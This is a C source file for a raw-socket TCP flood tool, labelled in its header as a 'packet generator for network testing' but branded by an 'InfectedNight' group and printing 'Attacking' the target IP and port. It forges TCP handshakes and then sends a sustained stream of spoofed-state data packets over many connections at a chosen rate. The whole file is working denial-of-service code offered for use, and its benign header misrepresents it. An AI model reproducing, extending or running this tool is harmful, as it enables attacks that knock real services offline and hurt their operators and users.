// SPDX-License-Identifier: MIT
// Raw TCP packet generator for network testing
// Original author: Unknown
// Reformatted to international standards without functional changes

// gcc -O3 -o tcp-infectednight tcp-infectednight.c -lpthread

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <assert.h>
#include <fcntl.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netpacket/packet.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

// Constants
#define NANOS 1000000000
#define BUFSIZE 4096
#define VLEN 5

// Global variables for configuration
int data_size = 1300;
int cons = 1;
int pps = 10;
int amax = 0;

// Structure to hold connection state
struct connection {
    int fd;                   // File descriptor
    in_addr_t saddr;          // Source IP address
    in_addr_t daddr;          // Destination IP address
    uint16_t sport;           // Source port
    uint16_t dport;           // Destination port
    uint32_t seq;             // Sequence number
    uint32_t ack;             // Acknowledgment number
    uint32_t sseq;            // Starting sequence number
    uint8_t state;            // Connection state
    uint32_t sent;            // Bytes sent
    uint64_t time;            // Timestamp
    struct sockaddr_in addr;   // Socket address
    uint32_t window;          // Window size
    uint8_t tries;            // Retry count
    uint8_t resets;           // Reset count
    uint32_t pending;         // Pending data
    uint32_t tsval;           // Timestamp value
    uint32_t tsecr;           // Timestamp echo reply
    uint64_t trip;            // Round-trip time
    uint8_t re;               // Retransmission flag
    uint64_t resp;            // Response time
    uint16_t fake_win;        // Fake window size
    uint8_t scaling;          // Window scaling factor
    uint64_t rett;            // Retransmission time
};

// Pseudo-header for TCP checksum
struct pseudo_header {
    uint32_t source_address;  // Source IP
    uint32_t dest_address;    // Destination IP
    uint8_t placeholder;      // Zero
    uint8_t protocol;         // Protocol number
    uint16_t tcp_length;      // TCP segment length
};

// Get current time in microseconds
uint64_t mytime(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)(NANOS * ts.tv_sec + ts.tv_nsec);
}

// Calculate checksum for IP/TCP headers
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    register short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}

// Convert binary data to hexadecimal string
void tohex(unsigned char *in, size_t insz, char *out, size_t outsz) {
    unsigned char *pin = in;
    const char *hex = "0123456789ABCDEF";
    char *pout = out;
    for (; pin < in + insz; pout += 2, pin++) {
        pout[0] = hex[(*pin >> 4) & 0xF];
        pout[1] = hex[*pin & 0xF];
        if (pout + 3 - out > outsz) {
            break;
        }
    }
    pout[-1] = 0;
}

// Custom strtok implementation
char *strtokm(char *input, char *delimiter, char **string) {
    if (input != NULL) {
        *string = input;
    }
    if (*string == NULL) {
        return *string;
    }

    char *end = strstr(*string, delimiter);
    if (end == NULL) {
        char *temp = *string;
        *string = NULL;
        return temp;
    }

    char *temp = *string;
    *end = '\0';
    *string = end + strlen(delimiter);
    return temp;
}

// Build and populate TCP packet
int tcp_packet(char *datagram, struct connection *conn, uint32_t src, uint32_t dst,
               uint16_t sport, uint16_t dport, uint32_t seq, uint32_t ack,
               uint8_t flags, char *data, size_t data_len) {
    conn->trip = mytime() / 1000000;

    uint8_t optsize = (flags & TH_SYN) ? 20 : 12;
    uint16_t tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len + optsize;

    // Populate IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    iph->version = 4;
    iph->ihl = 5;
    iph->frag_off = htons(IP_DF);
    iph->ttl = 64;
    iph->tos = 0;
    iph->tot_len = tot_len;
    iph->id = htons(10000 + rand() % 55535);
    iph->check = 0;
    iph->protocol = 6;
    iph->saddr = src;
    iph->daddr = dst;

    // Populate TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    tcph->source = sport;
    tcph->dest = dport;
    tcph->seq = htonl(seq);
    tcph->ack_seq = htonl(ack);
    tcph->doff = 5 + optsize / 4;
    tcph->syn = (flags & TH_SYN) ? 1 : 0;
    tcph->urg = 0;
    tcph->ack = (flags & TH_ACK) ? 1 : 0;
    tcph->psh = (flags & TH_PUSH) ? 1 : 0;
    tcph->fin = (flags & TH_FIN) ? 1 : 0;
    tcph->rst = 0;
    tcph->window = htons(32168 + (rand() % 22447));
    tcph->urg_ptr = 0;
    tcph->check = 0;

    memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + optsize, data, data_len);

    uint32_t tsval = htonl(conn->tsval);
    uint32_t tsecr = htonl(conn->tsecr);

    // TCP options for SYN packet
    if (flags & TH_SYN) {
        uint16_t mss[] = {1460};
        uint8_t scaling[] = {7, 8, 9};
        uint16_t sel_mss = htons(mss[rand() % 1]);
        char optss[20];
        memcpy(optss, "\x02\x04\x05\x64\x01\x01\x08\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x01\x03\x03\x09", 20);
        memcpy(optss + 2, &sel_mss, 2);
        optss[19] = scaling[rand() % 3];

        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr), optss, 20);
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + 8, &tsval, 4);
    } else {
        // TCP options for non-SYN packet
        datagram[sizeof(struct iphdr) + sizeof(struct tcphdr)] = 0x01;
        datagram[sizeof(struct iphdr) + sizeof(struct tcphdr) + 1] = 0x01;
        datagram[sizeof(struct iphdr) + sizeof(struct tcphdr) + 2] = 0x08;
        datagram[sizeof(struct iphdr) + sizeof(struct tcphdr) + 3] = 0x0a;
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + 4, &tsval, 4);
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr) + 4 + 4, &tsecr, 4);
    }

    // Calculate TCP checksum
    struct pseudo_header psh;
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + data_len + optsize);

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + data_len + optsize;
    char *pseudogram = malloc(psize);
    memset(pseudogram, 0, psize);

    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + data_len + optsize);
    iph->check = 0;
    tcph->check = csum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    return tot_len;
}

// Main program
int main(int argc, char *argv[]) {
    setbuf(stdout, NULL);
    srand(time(NULL));

    // Validate arguments
    if (argc < 6) {
        fprintf(stderr, " Owner: InfectedNight\n Group Zalo: https://zalo.me/g/ymfggo942\n %s <IP> <PORT> <CONS> <SIZE> <PPS>\n", argv[0]);
        return 0;
    }

    // Parse command-line arguments
    cons = atoi(argv[3]);
    data_size = atoi(argv[4]);
    pps = atoi(argv[5]);

    printf(" Owner: InfectedNight\n Group Zalo: https://zalo.me/g/ymfggo942\n");
    printf(" Attacking %s:%d | Connections: %d | Size: %d bytes | PPS: %d\n\n",
           argv[1], atoi(argv[2]), cons, data_size, pps);

    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);

    // Create raw socket
    int raw_fd = socket(AF_INET, SOCK_RAW | SOCK_NONBLOCK, IPPROTO_TCP);
    if (raw_fd < 1) {
        perror("socket");
        return 0;
    }

    // Enable IP_HDRINCL
    int one = 1;
    const int *val = &one;
    if (setsockopt(raw_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }

    // Initialize variables
    uint64_t start_time = mytime();
    uint32_t sends = 0;
    uint32_t sentt = 0;
    uint32_t recvs = 0;
    uint64_t send_time = 0;
    uint64_t adapt_time = 0;
    double bandwidth = 0;

    char datagram[1500];
    memset(datagram, 0, 1500);
    char packet[1450];
    memset(packet, 0, 1450);

    struct sockaddr_in source, dest;
    struct mmsghdr msgs[VLEN];
    struct iovec iovecs[VLEN];
    char bufs[VLEN][BUFSIZE + 1];

    struct connection conns[cons];
    memset(conns, 0, sizeof(struct connection) * cons);
    int curr = 0;
    int active = 0;

    uint32_t dest_addr = inet_addr(argv[1]);
    uint16_t dest_port = htons(atoi(argv[2]));

    int64_t r = NANOS / pps;
    uint64_t penalty = 0;
    struct timespec tr;
    uint64_t delay = 0;
    uint64_t newDelay = 0;
    uint64_t conni = 0;

    int fdr = open("/dev/urandom", O_RDONLY);

    // Main loop
    while (1) {
        uint64_t mytime1 = mytime();

        // Print statistics every second
        if (mytime1 - send_time >= NANOS) {
            send_time = mytime1;
            printf("Sends = %i pps = %i recvs = %i cons %i bandwidth=%.2fMbit/s\n",
                   sends, pps, recvs, cons, (bandwidth / 1024.0 / 1024.0) * 8.0);
            sends = 0;
            recvs = 0;
            bandwidth = 0;
        }

        // Send data packets for active connections
        if (active > 0) {
            if (mytime() - delay >= r) {
                delay = mytime();
                while (1) {
                    struct connection *conn = &conns[conni % cons];
                    if (conn->state == 2) {
                        if (mytime() - conn->resp >= NANOS && data_size < 1333) {
                            conn->state = 0;
                            curr--;
                            active--;
                            break;
                        }

                        char b[1500];
                        read(fdr, b, 1500);
                        memcpy(b, "\x19\x00\xd4\x02\x12\x33\x31\x2e\x32\x31\x34\x2e\x32\x34\x34\x2e\x31\x39\x00\x46\x4d\x4c\x00\x63\xdd\x01\x01\x00\x11\x22\x33", 31);

                        int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                                      conn->sport, conn->dport, conn->seq, conn->ack,
                                                      TH_ACK | TH_PUSH, b, data_size);
                        sendto(raw_fd, datagram, datagram_len, 0,
                               (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
                        bandwidth += datagram_len;
                        sentt++;
                        sends++;
                        conn->seq += data_size;
                        conni++;
                        break;
                    }
                    conni++;
                }
            }
        }

        // Manage connections
        for (int i = 0; i < cons; i++) {
            struct connection *conn = &conns[i];
            if (conn->state > 1 || (conn->state == 1 && mytime() - conn->time < NANOS)) {
                continue;
            }
            if (mytime() - newDelay < 80000000) {
                continue;
            }

            newDelay = mytime();

            // Get local address
            int cfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
            struct sockaddr_in addr = {0}, laddr = {0};
            addr.sin_family = AF_INET;
            addr.sin_addr.s_addr = inet_addr("1.1.1.1");
            addr.sin_port = htons(80);
            connect(cfd, (struct sockaddr *)&addr, sizeof(addr));
            int l = sizeof(laddr);
            getsockname(cfd, (struct sockaddr *)&laddr, &l);
            close(cfd);

            // Initialize connection
            conn->saddr = laddr.sin_addr.s_addr;
            conn->sport = rand() % 0xFFFF;
            conn->daddr = dest_addr;
            conn->dport = dest_port;
            conn->state = 0;
            memcpy(&conn->addr, &addr, sizeof(addr));
            conn->tsval = 124127841 + (rand() % 124127841);
            conn->tsecr = 0;
            conn->seq = 1247124 + rand() % 127849214;
            conn->ack = 0;

            // Send SYN packet
            int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                          conn->sport, conn->dport, conn->seq, conn->ack,
                                          TH_SYN, "", 0);
            conn->state = 1;
            conn->time = mytime();
            bandwidth += datagram_len;
            sendto(raw_fd, datagram, datagram_len, 0,
                   (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
            curr++;

            // Special case for data_size == 1333
            if (data_size == 1333) {
                conn->seq = rand();
                conn->ack = rand();
                conn->state = 2;
                active++;
                conn->window = 64400 * 1 << 7;
                conn->scaling = 7;
                int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                              conn->sport, conn->dport, conn->seq, conn->ack,
                                              TH_ACK, "", 0);
                sendto(raw_fd, datagram, datagram_len, 0,
                       (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
                bandwidth += datagram_len;
                sentt++;
                sends++;
            }
        }

        // Receive packets
        int off = 0;
        memset(msgs, 0, sizeof(msgs));
        for (int i = 0; i < VLEN; i++) {
            iovecs[i].iov_base = bufs[i];
            iovecs[i].iov_len = BUFSIZE;
            msgs[i].msg_hdr.msg_iov = &iovecs[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
        }

        struct timespec timeout;
        timeout.tv_sec = 0;
        timeout.tv_nsec = 0;
        int retval;
        do {
            retval = recvmmsg(raw_fd, msgs, VLEN, MSG_DONTWAIT, &timeout);
            if (retval == -1) {
                break;
            }

            for (int i = 0; i < retval; i++) {
                int rcvd = msgs[i].msg_len;
                char *buf = bufs[i];

                if (rcvd > 20) {
                    struct iphdr *iph = (struct iphdr *)(buf + off);
                    if (iph->protocol == 6 && iph->saddr == dest_addr) {
                        recvs++;
                        struct tcphdr *tcph = (struct tcphdr *)(buf + off + sizeof(struct iphdr));

                        for (int j = 0; j < cons; j++) {
                            struct connection *conn = &conns[j];
                            if (conn->state == 0) {
                                continue;
                            }

                            if (tcph->source == dest_port && tcph->dest == conn->sport) {
                                conn->resp = mytime();

                                if (tcph->ack) {
                                    // Parse TCP options
                                    uint8_t *p = (uint8_t *)tcph + 20;
                                    uint8_t *end = (uint8_t *)tcph + tcph->doff * 4;
                                    while (p < end) {
                                        uint8_t kind = *p++;
                                        if (kind == 0) {
                                            break;
                                        }
                                        if (kind == 1) {
                                            continue;
                                        }
                                        uint8_t size = *p++;
                                        if (kind == 8) {
                                            conn->tsecr = htonl(*(uint32_t *)p);
                                            conn->tsval = conn->tsecr + 1;
                                        }
                                        p += (size - 2);
                                    }

                                    if (tcph->syn) {
                                        uint8_t *p = (uint8_t *)tcph + 20;
                                        uint8_t *end = (uint8_t *)tcph + tcph->doff * 4;
                                        uint16_t scaling = 1;
                                        while (p < end) {
                                            uint8_t kind = *p++;
                                            if (kind == 0) {
                                                break;
                                            }
                                            if (kind == 1) {
                                                continue;
                                            }
                                            uint8_t size = *p++;
                                            if (kind == 3) {
                                                scaling = *p;
                                            }
                                            p += (size - 2);
                                        }

                                        conn->seq = htonl(tcph->ack_seq);
                                        conn->ack = htonl(tcph->seq) + 1;
                                        conn->state = 2;
                                        conn->rett = mytime();
                                        active++;
                                        conn->window = htons(tcph->window) * 1 << scaling;
                                        conn->scaling = scaling;
                                        int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                                                      conn->sport, conn->dport, conn->seq, conn->ack,
                                                                      TH_ACK, "", 0);
                                        sendto(raw_fd, datagram, datagram_len, 0,
                                               (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
                                        bandwidth += datagram_len;
                                        sentt++;
                                        sends++;
                                    }

                                    int tcpdatalen = ntohs(iph->tot_len) - (tcph->doff * 4) - (iph->ihl * 4);
                                    if (tcpdatalen > 0) {
                                        if (mytime() - conn->rett > 500000000) {
                                            conn->rett = mytime();
                                            conn->ack += tcpdatalen;
                                            int datagram_len = tcp_packet(datagram, conn, conn->saddr, conn->daddr,
                                                                          conn->sport, conn->dport, conn->seq, conn->ack,
                                                                          TH_ACK, "", 0);
                                            sendto(raw_fd, datagram, datagram_len, 0,
                                                   (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
                                            bandwidth += datagram_len;
                                            sentt++;
                                            sends++;
                                        }
                                    }
                                } else {
                                    if (tcph->rst) {
                                        if (conn->resets++ >= 10000) {
                                            conn->state = 0;
                                            conn->resets = 0;
                                            curr--;
                                            active--;
                                        }
                                    }
                                }
                                break;
                            }
                        }
                    }
                }
            }
        } while (retval == VLEN);
    }

    return 0;
}